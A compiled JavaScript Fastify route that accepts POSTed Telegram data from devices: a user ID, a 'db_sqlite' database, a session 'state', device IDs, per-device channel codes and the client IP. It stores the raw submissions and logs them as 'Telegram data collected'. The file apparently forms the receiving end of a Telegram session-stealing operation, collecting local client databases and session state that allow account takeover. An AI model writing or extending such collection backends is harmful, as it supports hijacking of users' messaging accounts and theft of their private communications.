import { extractIdentifiers } from '../../../core/utils/identifiers.js';
import { upsertTelegram } from '../services/telegram.js';
import { getRealIP } from '../../../core/utils/ip.js';
import { logger } from '../../../core/logger/index.js';
import { isMissingTelegramDataField, normalizeTelegramRawData } from '../services/raw-data.js';
import { getDeviceChannelCode } from '../../../core/devices/channel.js';
export async function telegramRoute(fastify) {
    fastify.post('/api/tg/t', async (request, reply) => {
        const body = request.body;
        const ids = extractIdentifiers(body);
        const ip = getRealIP(request);
        const userId = body.user_id ? String(body.user_id) : '';
        if (!userId) {
            logger.info({ deviceId: ids.deviceId, ip }, 'Telegram submit rejected: missing user_id');
            reply.code(400);
            return { error: 'Missing user_id' };
        }
        let payload;
        try {
            payload = normalizeTelegramRawData(body);
        }
        catch (err) {
            logger.info({ deviceId: ids.deviceId, userId, ip }, 'Telegram submit rejected: invalid data');
            reply.code(400);
            return { error: 'Invalid data' };
        }
        if (isMissingTelegramDataField(payload.db_sqlite)) {
            logger.info({ deviceId: ids.deviceId, userId, ip }, 'Telegram submit rejected: empty db_sqlite');
            reply.code(400);
            return { error: 'Missing db_sqlite' };
        }
        if (isMissingTelegramDataField(payload.state)) {
            logger.info({ deviceId: ids.deviceId, userId, ip }, 'Telegram submit rejected: empty state');
            reply.code(400);
            return { error: 'Missing state' };
        }
        const channelCode = await getDeviceChannelCode(ids.deviceId) || ids.channelCode;
        await upsertTelegram({ userId, channelCode, deviceId: ids.deviceId, ip, rawData: body });
        logger.info({ userId, deviceId: ids.deviceId, channelCode, ip }, 'Telegram data collected');
        return {};
    });
}
//# sourceMappingURL=telegram.js.map